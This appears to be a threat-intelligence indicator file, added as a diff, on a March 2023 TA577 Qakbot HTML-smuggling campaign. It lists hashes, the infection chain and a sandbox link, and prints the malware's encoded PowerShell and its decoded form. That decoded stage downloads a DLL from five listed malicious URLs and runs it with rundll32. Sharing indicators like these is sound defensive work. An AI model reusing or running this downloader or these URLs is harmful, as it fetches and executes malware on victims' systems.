@@ -1,0 +1,36 @@
+TA577 | Qakbot | 2023.03.22 | HTML SMUGGLING
+# --------------------------------------------------------- #
+# ------------------------ SOURCE ------------------------- #
+# --------------------------------------------------------- #
+.html   5ff222465aaccdfac9baf0cb584e3883761b07661482246c39cf8576085091e1
+.zip    36007dbb80a0ec8156642e74f4f90335a1f683e27f3aef213ed4172841ddbb8e
+.js     1a7737a2d26b081a6a0035e07edd32b9ad5417aa18be6f269ab3cdb6ea107ae6
+
+eml > .html > .zip > .js > .ps1 > .dll
+
+# --------------------------------------------------------- #
+# -------------------- SANDBOX REPORT/S ------------------- #
+# --------------------------------------------------------- #
+https://private.tria.ge/230321-x8nlwsanbj
+
+
+# --------------------------------------------------------- #
+# ----------------------- EXECUTION ----------------------- #
+# --------------------------------------------------------- #
+C:\Windows\system32\wscript.exe
+wscript.exe C:\Users\Admin\AppData\Local\Temp\vV.js
+
+    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -encodedcommand "UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANAA7ACQAUwBoAHUAbgBwAGkAawBlAHIAcwBLAGkAbgBkAGwAaQBuAGcAcwAgAD0AIAAoACIAaAB0AHQAcABzADoALwAvAGEAbQBhAHoAbwBuAG4AZQBvAG4ALgBjAG8AbQAvAFkARABQAGoAZwB2ADAALwBTAHUAVQBEAEIASAA5ACwAaAB0AHQAcABzADoALwAvAGUAbQBiAHIAbwBpAGQAZQByAHkALQBnAHUAbABmAC4AYwBvAG0ALwBDAE8AQQB4AFoAagBiAC8ASgBiAE4AVgBpAFAAMgBHACwAaAB0AHQAcABzADoALwAvAGYAaQBuAGUAYQBkAHYAaQBjAGUAZgBvAHUAbgBkAGEAdABpAG8AbgAuAG8AcgBnAC8AMwB5AHgASQB0AHkAeAAvADQAawBiADAAVgByADYAbABxAEsASAAsAGgAdAB0AHAAcwA6AC8ALwBzAHQAbwBhAGkAbgBkAHUAcwB0AHIAaQBhAC4AYwBvAG0ALgBiAHIALwBEAGcAZQBiAHIAUQAvAHUAegBRADcATQBjAFYANwAsAGgAdAB0AHAAcwA6AC8ALwBrAHAAbQBhAHMAdABlAHIAYwBoAGEAcgB0AC4AYwBvAG0ALwBGAGsAeABXAC8ARABKAHcAVwAzAFkAMwAiACkALgBzAHAAbABpAHQAKAAiACwAIgApADsAZgBvAHIAZQBhAGMAaAAgACgAJABEAGkAcABzAG8AcABhAHQAaAB5AEgAZQBwAGEAdABpAGMAbwBsAG8AZwBpAHMAdAAgAGkAbgAgACQAUwBoAHUAbgBwAGkAawBlAHIAcwBLAGkAbgBkAGwAaQBuAGcAcwApACAAewB0AHIAeQAgAHsASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAJABEAGkAcABzAG8AcABhAHQAaAB5AEgAZQBwAGEAdABpAGMAbwBsAG8AZwBpAHMAdAAgAC0AVABpAG0AZQBvAHUAdABTAGUAYwAgADEANwAgAC0ATwAgACQAZQBuAHYAOgBUAEUATQBQAFwAUABoAGEAbABhAG4AcwB0AGUAcgBpAHMAbQBOAGUAdwBuAGUAcwBzAC4AZABsAGwAOwBpAGYAIAAoACgARwBlAHQALQBJAHQAZQBtACAAJABlAG4AdgA6AFQARQBNAFAAXABQAGgAYQBsAGEAbgBzAHQAZQByAGkAcwBtAE4AZQB3AG4AZQBzAHMALgBkAGwAbAApAC4AbABlAG4AZwB0AGgAIAAtAGcAZQAgADEAMAAwADAAMAAwACkAIAB7AHMAdABhAHIAdAAgAHIAdQBuAGQAbABsADMAMgAgACQAZQBuAHYAOgBUAEUATQBQAFwAXABQAGgAYQBsAGEAbgBzAHQAZQByAGkAcwBtAE4AZQB3AG4AZQBzAHMALgBkAGwAbAAsAEcATAA3ADAAOwBiAHIAZQBhAGsAOwB9AH0AYwBhAHQAYwBoACAAewBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAA0ADsAfQB9AA=="
+
+
+Start-Sleep -Seconds 4;$ShunpikersKindlings = ("https://amazonneon.com/YDPjgv0/SuUDBH9,https://embroidery-gulf.com/COAxZjb/JbNViP2G,https://fineadvicefoundation.org/3yxItyx/4kb0Vr6lqKH,https://stoaindustria.com.br/DgebrQ/uzQ7McV7,https://kpmasterchart.com/FkxW/DJwW3Y3").split(",");foreach ($DipsopathyHepaticologist in $ShunpikersKindlings) {try {Invoke-WebRequest $DipsopathyHepaticologist -TimeoutSec 17 -O $env:TEMP\PhalansterismNewness.dll;if ((Get-Item $env:TEMP\PhalansterismNewness.dll).length -ge 100000) {start rundll32 $env:TEMP\\PhalansterismNewness.dll,GL70;break;}}catch {Start-Sleep -Seconds 4;}}
+
+# --------------------------------------------------------- #
+# -------------------------- URLs -------------------------- #
+# --------------------------------------------------------- #
+https://amazonneon.com/YDPjgv0/SuUDBH9
+https://embroidery-gulf.com/COAxZjb/JbNViP2G
+https://fineadvicefoundation.org/3yxItyx/4kb0Vr6lqKH
+https://stoaindustria.com.br/DgebrQ/uzQ7McV7
+https://kpmasterchart.com/FkxW/DJwW3Y3
